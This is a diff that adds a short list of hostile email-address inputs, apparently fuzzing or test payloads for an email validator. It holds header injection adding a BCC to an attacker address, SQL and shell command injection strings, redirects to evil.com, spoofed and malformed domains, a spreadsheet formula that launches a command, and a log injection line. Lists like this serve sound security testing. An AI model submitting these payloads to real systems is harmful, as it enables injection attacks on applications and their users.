@@ -1,0 +1,31 @@
+test@example.com%0d%0aBCC:attacker@example.com
+test@example.com\r\nBCC:attacker@example.com
+test@example.com%0aCC:attacker@example.com
+test@example.com\r\nContent-Type:text/html\r\n\r\n<b>Injected</b>
+
+test' OR '1'='1@example.com
+test" OR "1"="1@example.com
+test@example.com'--
+test@example.com") OR 1=1--
+
+test@example.com; whoami
+test@example.com && id
+test@example.com | uname -a
+test@example.com`id`
+
+test@example.com%0d%0aLocation:https://evil.com
+test@example.com/?next=https://evil.com
+
+"test@evil.com"@example.com
+test@subdomain..com
+test@-example.com
+test@.com
+test@exam_ple.com
+test@examp℮.com
+
+test@example.com%0d%0aInjected-Header: injected
+test@example.com%0aInjected-Header: injected
+
+=cmd|' /C calc'!A0
+"=HYPERLINK(\"http://evil.com\")"
+test@example.com\nInjectedLogEntry
